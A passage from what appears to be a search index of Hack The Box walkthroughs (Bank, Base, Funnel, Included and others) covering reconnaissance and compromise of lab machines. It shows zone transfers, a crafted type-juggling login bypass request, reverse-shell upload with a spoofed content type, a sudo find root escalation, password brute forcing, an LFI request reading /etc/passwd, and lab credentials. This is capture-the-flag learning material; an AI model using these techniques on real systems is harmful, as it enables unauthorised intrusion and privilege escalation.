SERVICE VERSION\n53/udp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <p>Open browser and examine http://10.129.29.200 and an Apache web server banner.</p> <p>Since the DNS server is running on port 53 TCP/UDP, we can attempt a zone transfer. However, it is worth noting that guessing bank.thb as a valid zone for this transfer is not a very realistic or scientific approach to penetration testing. Nevertheless, since this is HackTheBox and we are playing this game, let's allow ourselves to go with the flow.</p> <p>Go here for \"digging more into DNS transfer zones\".</p> <pre><code>dig axfr bank.htb @10.129.29.200\n</code></pre> <p>Results:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.12-1-Debian &lt;&lt;&gt;&gt; axfr bank.htb @10.129.29.200\n;; global options: +cmd\nbank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800\nbank.htb.               604800  IN      NS      ns.bank.htb.\nbank.htb.               604800  IN      A       10.129.29.200\nns.bank.htb.            604800  IN      A       10.129.29.200\nwww.bank.htb.           604800  IN      CNAME   bank.htb.\nbank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800\n</code></pre> <p>Add those results to /etc/hosts:</p> <pre><code>echo \"10.129.29.200   bank.htb chris.bank.htb ns.bank.htb www.bank.htb\" | sudo tee -a /etc/hosts \n</code></pre>","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-bank/#enumeration","title":"Enumeration","text":"<pre><code>whatweb http://bank.htb\n</code></pre> <p>Results:</p> <pre><code>http://bank.htb [302 Found] Apache[2.4.7], Bootstrap, Cookies[HTBBankAuth], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.129.29.200], JQuery, PHP[5.5.9-1ubuntu4.21], RedirectLocation[login.php], Script, X-Powered-By[PHP/5.5.9-1ubuntu4.21]                                                                                                       \nhttp://bank.htb/login.php [200 OK] Apache[2.4.7], Bootstrap, Cookies[HTBBankAuth], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.129.29.200], JQuery, PHP[5.5.9-1ubuntu4.21], PasswordField[inputPassword], Script, Title[HTB Bank - Login], X-Powered-By[PHP/5.5.9-1ubuntu4.21]\n</code></pre> <p>After browsing the site, reading the source code and trying some SQL injections, let's do some more enumeration.</p> <pre><code>gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n</code></pre> <p>Results:</p> <pre><code>/uploads              (Status: 301) [Size: 305] [--&gt; http://bank.htb/uploads/]\n/assets               (Status: 301) [Size: 304] [--&gt; http://bank.htb/assets/]\n/inc                  (Status: 301) [Size: 301] [--&gt; http://bank.htb/inc/]\n/server-status        (Status: 403) [Size: 288]\n/balance-transfer     (Status: 301) [Size: 314] [--&gt; http://bank.htb/balance-transfer/]\n</code></pre> <p>We have  a data breach under http://bank.htb/balance-transfer/</p>","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-bank/#exploitation","title":"Exploitation","text":"<p>Browsing that exposed URL we can filter columns by size. That would be a quick way to spot the file that contains the credentials (it has a different size from the others). Again, this is HackTheBox and not the reality. In the real world you would probably download as silently as possible all the files, for further processing.  </p> <p>But this is HackTheBox and we have credentials to proceed to the next step. Login into the dashboard http://bank.htb/login.php:</p> <pre><code>--ERR ENCRYPT FAILED\n+=================+\n| HTB Bank Report |\n+=================+\n\n===UserAccount===\nFull Name: Christos Christopoulos\nEmail: chris@bank.htb\nPassword: !##HTBB4nkP4ssw0rd!##\nCreditCards: 5\nTransactions: 39\nBalance: 8842803 .\n===UserAccount===\n</code></pre> <p>Browsing around a little, and reading source code, you can easily find a valuable debug comment:</p> <p></p> <p>With this, I just modified my pentesmonkey file to extension .htb and had it uploaded. Under column \"Attachment\" in the dashboard, you have the link to the uploaded file.</p> <p>Start a netcat listener:</p> <pre><code>nc -lnvp 1234\n</code></pre> <p>In my case, I clicked on http://bank.htb/uploads/pentesmonkey.htb and got a reverse shell.</p> <p>Cat the user.txt</p>","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-bank/#flag-roottxt","title":"Flag root.txt","text":"<p>After some basic reconnaissance, I run:</p> <pre><code>find / -perm /4000 2&gt;/dev/null\n</code></pre> <p>And results:</p> <pre><code>/var/htb/bin/emergency\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/policykit-1/polkit-agent-helper-1\n...\n</code></pre> <p><code>/var/htb/bin/emergency</code> catches our attention inmediately. Doing a strings on it we can see that it contains a \"/bin/bash\" command. After resolving this machine, I read this writeup and got some insights about how to investigate an elf file beyond doing some strings. In this writeup, a md5sum is done and googling the hash returned that this elf file is in reality a dash shell.</p> <p>Nice. Run the binary and you are root. If you have spawned the shell you may run into problems. Better do it without spawning it.</p> <pre><code>./var/htb/bin/emergency\n</code></pre>","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-base/","title":"Base - A Hack The Box machine","text":"<p>Enumerate open ports and services.</p> <pre><code>nmap -sC -sV $ip -Pn\n</code></pre> <p>Ports 22 and 80 are open.</p> <p>Add base.htb to /etc/hosts.</p> <p>Enumerate directories:</p> <pre><code>gobuster dir -u http://base.htb/login -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/big.txt\n</code></pre> <p>Some file and folders uncovered:</p> <pre><code>- http://base.htb/_uploaded/\n- http://base.htb/login/\n- http://base.htb/login/login.php\n- http://base.htb/forms/\n- http://base.htb/assets/\n- http://base.htb/logout.php\n</code></pre> <p>Under  /login there are three files: login.php, config.php and login.php.swp. There are two ways of reading the swap file, with strings and with vim:</p> <pre><code>vim -r login.php.swp\n# -r  -- list swap files and exit or recover from a swap file\n</code></pre> <p>Content:</p> <pre><code>&lt;?php\nsession_start();\nif (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {\n    require('config.php');\n    if (strcmp($username, $_POST['username']) == 0) {\n        if (strcmp($password, $_POST['password']) == 0) {\n            $_SESSION['user_id'] = 1;\n            header(\"Location: /upload.php\");\n        } else {\n            print(\"&lt;script&gt;alert('Wrong Username or Password')&lt;/script&gt;\");\n        }\n    } else {\n        print(\"&lt;script&gt;alert('Wrong Username or Password')&lt;/script&gt;\");\n    }\n}\n</code></pre> <p>Quoting from the article PHP Type Juggling Vulnerabilities: \"When comparing values, always try to use the type-safe comparison operator \u201c===\u201d instead of the loose comparison operator \u201c==\u201d. This will ensure that PHP does not type juggle and the operation will only return True if the types of the two variables also match. This means that (7 === \u201c7\u201d) will return False.\"</p> <p>My notes about php type jugling. </p> <p>In the HackTheBox machine Base, login form was bypasseable by entering an empty array into the username and password parameters:</p> <pre><code>Original request\n\n\nPOST /login/login.php HTTP/1.1\nHost: base.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 57\nOrigin: http://base.htb\nConnection: close\nReferer: http://base.htb/login/login.php\nCookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt\nUpgrade-Insecure-Requests: 1\n\nusername=admin&amp;password=admin\n</code></pre> <pre><code>Crafted request:\n\nPOST /login/login.php HTTP/1.1\nHost: base.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 57\nOrigin: http://base.htb\nConnection: close\nReferer: http://base.htb/login/login.php\nCookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt\nUpgrade-Insecure-Requests: 1\n\nusername[]=admin&amp;password[]=admin\n</code></pre> <p>How to know? By spotting the file login.php.swp in the /login exposed directory and reading its contents.</p> <p>After sending request with BurpSuite, grab the PHPsession cookie and in your browser enter that cookie and go to: http://base.htb/upload.php. Now you can upload our pentesmonkey shell using BurpSuite Repeater (important note: change header to \"Content-Type: image/png\", file extension may remain php). Have your netcat listener ready.</p> <pre><code>whoami\n</code></pre> <pre><code>www-data\n</code></pre> <p>Credentials can be found at /var/www/html/login/config.php. Use them to login as the existing user at /home</p> <pre><code>su john\n# enter password: thisisagoodpassword\n</code></pre> <p>Once you are john, you have access to user.txt. Also, to be root:</p> <pre><code>id\nsudo -l\n</code></pre> <pre><code>ohn@base:~$ sudo -l\nsudo -l\n[sudo] password for john: thisisagoodpassword\n\nMatching Defaults entries for john on base:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser john may run the following commands on base:\n    (root : root) /usr/bin/find\n</code></pre> <p>See cheat sheet about suid binaries and:</p> <pre><code>sudo find . -exec /bin/sh \\; -quit\n</code></pre> <p>Now you are root and can echo /root/root.txt</p>","tags":["walkthrough","php type juggling","reverse shell","suid binary","linux privilege escalation"]},{"location":"htb-crocodile/","title":"Crocodile - A HackTheBox machine","text":"<pre><code>nmap -sC -A $ip -Pn\n</code></pre> <p>Results:</p> <pre><code>PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.14.2\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist\n|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Smash - Bootstrap Business Template\nService Info: OS: Unix\n</code></pre> <p>Now we enumerate directories:</p> <pre><code>gobuster dir -e -u http://10.129.1.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -r \n</code></pre> <p>Results:</p> <pre><code>===============================================================\nGobuster v3.5\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.129.1.15/\n[+] Method:                  GET\n[+] Threads:                 20\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.5\n[+] Follow Redirect:         true\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2023/05/01 16:21:20 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://10.129.1.15/assets               (Status: 200) [Size: 1703]\nhttp://10.129.1.15/css                  (Status: 200) [Size: 1350]\nhttp://10.129.1.15/js                   (Status: 200) [Size: 1138]\nhttp://10.129.1.15/fonts                (Status: 200) [Size: 1968]\nhttp://10.129.1.15/dashboard            (Status: 200) [Size: 1577]\nhttp://10.129.1.15/server-status        (Status: 403) [Size: 276]\nProgress: 220534 / 220561 (99.99%)\n===============================================================\n2023/05/01 16:29:51 Finished\n===============================================================\n</code></pre> <p>At the same time, we explore ftp service. Anonymous login is allowed.</p> <pre><code>ftp 10.129.1.15 \ndir\nmget *\n</code></pre> <p>Two files are downloaded. </p> <pre><code>cat allowed.userlist\n</code></pre> <p>Results:</p> <pre><code>aron\npwnmeow\negotisticalsw\nadmin\n</code></pre> <p>And passwords:</p> <pre><code>cat allowed.userlist.passwd \n</code></pre> <p>Results:</p> <pre><code>root\nSupersecretpassword1\n@BaASD&amp;9032123sADS\nrKXM59ESxesUFHAd\n</code></pre> <p>Now we can enter in http://10.129.1.15/dashboard with credentials for admin. Flag is in the main panel.</p>","tags":["walkthrough"]},{"location":"htb-explosion/","title":"Explosion - A HackTheBox machine","text":"<pre><code>nmap -sC -sV $ip -Pn\n</code></pre> <pre><code>PORT     STATE SERVICE       VERSION\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: EXPLOSION\n|   NetBIOS_Domain_Name: EXPLOSION\n|   NetBIOS_Computer_Name: EXPLOSION\n|   DNS_Domain_Name: Explosion\n|   DNS_Computer_Name: Explosion\n|   Product_Version: 10.0.17763\n|_  System_Time: 2023-04-27T10:42:37+00:00\n|_ssl-date: 2023-04-27T10:42:45+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=Explosion\n| Issuer: commonName=Explosion\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-04-26T10:27:02\n| Not valid after:  2023-10-26T10:27:02\n| MD5:   2446e544fced2077f37238e35735b16e\n| SHA-1: cace39c8a8b0ae2a4bf509705cc78f084b9aec0b\n| -----BEGIN CERTIFICATE-----\n| MIIC1jCCAb6gAwIBAgIQadtbfAUkgr5BZjE2eNbcBzANBgkqhkiG9w0BAQsFADAU\n| MRIwEAYDVQQDEwlFeHBsb3Npb24wHhcNMjMwNDI2MTAyNzAyWhcNMjMxMDI2MTAy\n| NzAyWjAUMRIwEAYDVQQDEwlFeHBsb3Npb24wggEiMA0GCSqGSIb3DQEBAQUAA4IB\n| DwAwggEKAoIBAQDSS2eXLWZRkoPS26o641YgH94ZMh9lCyaz2qMPhHsbjNGwZSTC\n| WY+Pm8nAROk5HTTq0CYHWyKZN7I2dONAG42I6pRWdpV3k5NwTj3wCR7BB1WqL5mB\n| CTN7LxfEzngrdU1tPI6FdSkI12I+2h+ckz+2lUaY58+3ENNGe06U82jE8RrEmnFd\n| 0Is0UvA3D3ec2Mzr1Ji8LRko3/rMhggn9T5n75Kh0PstZoRdN+XVjcKfazIfhkZb\n| Wz0/BXcB5fwfSGOWaKcHIL26IviI8DbgS46d4Ydw0tGWE+8BHt3jizillCueg03v\n| TYj4W6d9nqDB1/QmUz9w1tqviUZM7qPCK6qxAgMBAAGjJDAiMBMGA1UdJQQMMAoG\n| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEANyNIxLXD\n| ftgW+zs+5JGz2WbeLauLLWE3+LJNfMxGWZr9BJAaF4VX0V/dXP3MXLywhqsz+V56\n| mam2jNi44nu4ov+1FgqPKsRdUEb8uOocWEAUE28L48Eh0M09JjVg639REwzqohPV\n| KyqdnHhPkCNH3Js8nJCZkAl6EgWJMWLenD0htNTkJHjtHSR0D3Dyc08WsMPmyOtX\n| m+4Oi8RS7qrHYG0nCvQmJpvNO9eiqYfVVzP5Q06K45hZ/xlVTVePhJFxdVGcc7CH\n| qEILmRdzuvKaRpAD6QocoUm8I3wogOTTV4DcsNOnNSLoFj/TI8i5FV791lZDEzcL\n| bWFK5GD+11kCOw==\n|_-----END CERTIFICATE-----\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 0s, deviation: 0s, median: 0s\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2023-04-27T10:42:40\n|_  start_date: N/A\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 37798/tcp): CLEAN (Couldn't connect)\n|   Check 2 (port 6858/tcp): CLEAN (Couldn't connect)\n|   Check 3 (port 35582/udp): CLEAN (Timeout)\n|   Check 4 (port 50597/udp): CLEAN (Failed to receive data)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n</code></pre> <p>After going through all open ports, running this nmap script on 3389 gives us interesting results:</p> <pre><code>nmap -Pn -sV -p3389 --script rdp-* $ip\n</code></pre> <p>Resolution of machine in port 3389 tricks.</p>","tags":["walkthrough"]},{"location":"htb-friendzone/","title":"Walkthrough - Friendzone, a Hack The Box machine","text":"<pre><code>nmap -sC -sV $IP -Pn\n</code></pre> <pre><code>\u2514\u2500$ nmap -sC -sV $IP -Pn          \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-04-18 18:23 EDT\nStats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 14.29% done; ETC: 18:23 (0:00:00 remaining)\nStats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 28.57% done; ETC: 18:23 (0:00:00 remaining)\nStats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 28.57% done; ETC: 18:23 (0:00:15 remaining)\nNmap scan report for 10.129.228.87\nHost is up (0.045s latency).\nNot shown: 993 closed tcp ports (conn-refused)\nPORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 3.0.3\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)\n|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)\n|_  256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)\n53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu\n80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Friend Zone Escape software\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n443/tcp open  ssl/http    Apache httpd 2.4.29\n|_http-title: 404 Not Found\n| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO\n| Not valid before: 2018-10-05T21:02:30\n|_Not valid after:  2018-11-04T21:02:30\n|_ssl-date: TLS randomness does not represent time\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n| tls-alpn: \n|_  http/1.1\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\nService Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n| smb2-time: \n|   date: 2023-04-18T22:23:28\n|_  start_date: N/A\n|_clock-skew: mean: -59m59s, deviation: 1h43m54s, median: 0s\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: friendzone\n|   NetBIOS computer name: FRIENDZONE\\x00\n|   Domain name: \\x00\n|   FQDN: friendzone\n|_  System time: 2023-04-19T01:23:29+03:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 35.34 seconds\n</code></pre> <p>Interesting here: port 53 open. On port 443 you can read:</p> <p>| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO</p> <p>We have here domain name friendzone.red. Also visiting the ip in the browser there is an info email with domain friendzoneportal.red.</p> <p>Enumerating shares in samba:</p> <p><pre><code>smbclient -L 10.129.228.87\nsmbmap -H 10.129.228.87\n</code></pre> An alternative is using enum4linux.md.</p> <p>Checking out each shared folder:</p> <pre><code>smbclient \\\\\\\\10.129.228.87\\\\Files\nsmbclient \\\\\\\\10.129.228.87\\\\print$\nsmbclient \\\\\\\\10.129.228.87\\\\general\nsmbclient \\\\\\\\10.129.228.87\\\\Developement\nsmbclient \\\\\\\\10.129.228.87\\\\IPC$\n</code></pre> <p>From shared folder general and samba terminal we can download the file creds.txt</p> <pre><code>dir\nmget *\n</code></pre>","tags":["walkthrough"]},{"location":"htb-friendzone/#transferring-dns-zone","title":"Transferring DNS zone","text":"<p>Some HackTheBox machines exploits DNS zone transfer:</p> <p>In the example of Friendzone machine, accessible web page on port 80 provides an email in which a different domain is appreciated. Also port 53 is open, which is an indicator of some possible DNS zone transfer.</p> <p>In friendzone, we will transfer our zone to all zones spotted in different scanners:</p> <pre><code># friendzone.red was spotted in the nmap scan. Transferring 10.129.228.87 zone to friendzone.red\ndig axfr friendzone.red @10.129.228.87\n\n# Also friendzoneportal.red was spotted in the email that appeared on http://10.129.228.87. Transferring 10.129.228.87 zone to friendzoneportal.red:\ndig axfr friendzoneportal.red @10.129.228.87\n</code></pre> <p>Add those subdomains to your /etc/hosts</p> <p>Visit https://administrator1.friendzone.red and a login panel is displayed. Use credentials found in samba shared folder. After login into the application a message is displayed: \"Login Done ! visit /dashboard.php\".</p> <p></p>","tags":["walkthrough"]},{"location":"htb-funnel/","title":"Walkthrough - A HackTheBox machine - Funnel","text":"<p>Enumerate port/services:</p> <pre><code>nmap -sV -sC $ip -Pn -p-\n</code></pre> <p>Open ports: 21  and 22.</p> <p>We can log into ftp with anonymous user:</p> <pre><code>ftp $ip\n# enter user when prompted: anonymous\n# Press enter when prompted for password.\n</code></pre> <p>In the ftp service there is a directory, mail_backup. </p> <pre><code>cd mail_backup\nmget *\n</code></pre> <p>Get users from file welcome_28112022</p> <ul> <li>optimus@funnel.htb </li> <li>albert@funnel.htb </li> <li>andreas@funnel.htb </li> <li>christine@funnel.htb </li> <li>maria@funnel.htb</li> </ul> <p>Get default password from file password_policy.pdf: \"funnel123#!#\".</p> <p>You can use hydra or try out manually to access. Finally user with default password is christine:</p> <pre><code>sshpass -p 'funnel123#!#' ssh christine@10.129.228.102\n</code></pre> <p>Now we can enumerate socket connections with the command \"ss\"</p> <pre><code>ss -tl\n#-l: Display only listening sockets.\n#-t: Display TCP sockets.\n</code></pre> <p>Results:</p> <pre><code>State  Recv-Q Send-Q Local Address:Port       Peer Address:PortProcess \nLISTEN 0      4096   127.0.0.53%lo:domain          0.0.0.0:*           \nLISTEN 0      128          0.0.0.0:ssh             0.0.0.0:*           \nLISTEN 0      4096       127.0.0.1:postgresql      0.0.0.0:*           \nLISTEN 0      4096       127.0.0.1:33599           0.0.0.0:*           \nLISTEN 0      32                 *:ftp                   *:*           \nLISTEN 0      128             [::]:ssh                [::]:* \n</code></pre> <p>postgresql is in use. Since our user is not in the sudoers file and can not install a postgres client, we can bypass this situation via port forwarding.</p> <p>If the tool is not installed, then run in the atacker machine:</p> <pre><code>sudo apt install postgresql-client-common\n</code></pre> <p>1. In the attacking machine:</p> <pre><code>ssh UserNameInTheAttackedMachine@IPOfTheAttackedMachine -L 1234:localhost:5432 \n# We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.\n# We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.\n</code></pre> <p>2. In another terminal in the attacking machine:</p> <pre><code>sudo apt update &amp;&amp; sudo apt install postgresql postgresql-client-common \n# this will install postgresql in case you don't have it.\n\npsql -U christine -h localhost -p 1234\n# Using our installation of psql, we can now interact with the PostgreSQL service running locally on the target machine:\n# -U: to specify user.\n# -h: to specify localhost. \n# -p 1234 as we are targeting the tunnel we created earlier with SSH, we need to specify which is the port the tunnel is listening on.\n</code></pre> <p>Once logged in, use postgresql cheat sheet to get the flag.</p>","tags":["walkthrough","postgresql","ftp"]},{"location":"htb-greenhorn/","title":"Walkthrough - Greenhorn - A HackTheBox machine","text":"<p>Enumerate open services:</p> <pre><code>nmap -sC -sV $ip -Pn\n</code></pre> <p>Port 22, 80 3000.  Also, banner greenhorn.htb is displayed</p> <ul> <li>Port 80 has the service HTTP generator Pluck 4.7.18, well-known for a RCE vulnerability.</li> <li>Port 3000 contains a Gitea hosting all the source code of the web service on port 80.</li> <li>Port 8000 contains a PHP cli server 5.5</li> </ul> <p>Read \u00a0<code>pass.php</code>\u00a0file in the\u00a0<code>/data/settings/</code>\u00a0path. It's a hashed 512 password.</p> <p>Searching for it you will obtain that password is iloveyou1. </p> <p>Enter it in http://greenhorn.htb/login.php and you will access to the admin panel. </p> <p>Exploitation of the CMS is done with this POC: https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC</p> <p>With that you will get access to the www-data user. Go to home folder. There is an user named junior. </p> <pre><code>su junior\n</code></pre> <p>Password is the same as the CMS. Now you can print user.txt</p> <p>Escalating provileges involves the use of the tool depix for extracting root password from the pdf file saved at <code>/home/junior/Using OpenVAS.pd</code>. </p>","tags":["walkthrough","pluck-cms","rce","file-upload"]},{"location":"htb-ignition/","title":"Ignition, a Hack The Box Machine","text":"<pre><code>nmap -sC -sV $ip -Pn\n</code></pre> <p>Adding ignition.htb to /etc/hosts</p> <p>Enumerating: <pre><code>dir -u http://ignition.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -t 40\n</code></pre></p> <p>Browsing found files and gathering information:</p> <pre><code>/home                 (Status: 200) [Size: 25802]\n/contact              (Status: 200) [Size: 28673]\n/media                (Status: 301) [Size: 185] [--&gt; http://ignition.htb/media/]\n/0                    (Status: 200) [Size: 25803]\n/static               (Status: 301) [Size: 185] [--&gt; http://ignition.htb/static/]\n/catalog              (Status: 302) [Size: 0] [--&gt; http://ignition.htb/]\n/admin                (Status: 200) [Size: 7095]\n/Home                 (Status: 301) [Size: 0] [--&gt; http://ignition.htb/home]\n/setup                (Status: 301) [Size: 185] [--&gt; http://ignition.htb/setup/]\n/checkout             (Status: 302) [Size: 0] [--&gt; http://ignition.htb/checkout/cart/]\n/robots               (Status: 200) [Size: 1]\n/wishlist             (Status: 302) [Size: 0] [--&gt; http://ignition.htb/customer/account/login/referer/aHR0cDovL2lnbml0aW9uLmh0Yi93aXNobGlzdA%2C%2C/]    \n/soap                 (Status: 200) [Size: 391]\n</code></pre> <p>Knowing this we could do a more precise enumeration with:</p> <pre><code>gobuster dir -u http://ignition.htb -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/CMS/sitemap-magento.txt  \n</code></pre> <p>From /admin we get to a login panel of a Magento application. From /setup we obtain the Magento version: Version dev-2.4-develop.</p> <p>Brute forcing it:</p> <pre><code>wfuzz -c -z file,/usr/share/wordlists/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt -d \"login%5Busername%5D=admin&amp;login%5Bpassword%5D=FUZZ\" http://ignition.htb/admin\n</code></pre> <p>Enter in /admin with credentials. Flag is in the dashboard.</p>","tags":["walkthrough"]},{"location":"htb-included/","title":"Included - A HackTheBox machine","text":"<p>After running a port scan, the only open port is 80.</p> <pre><code>nmap -sC -sV $ip -Pn -p-\n</code></pre> <p>Results:</p> <pre><code>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n| http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_Requested resource was http://10.129.95.185/?file=home.php\n</code></pre> <p>After visiting the site with the browser and examining its code, it's a simple web site. php is used. The endpoint that appears in the scanner has a LFI vulnerability and some files can be read.</p> <p>Burpsuite request:</p> <pre><code>GET /?file=../../../../../../etc/passwd HTTP/1.1\nHost: 10.129.95.185\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n</code></pre> <p>Result:</p> <pre><code>HTTP/1.1 200 OK\nDate: Mon, 08 May 2023 07:04:13 GMT\nServer: Apache/2.4.29 (Ubuntu)\nVary: Accept-Encoding\nContent-Length: 1575\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System 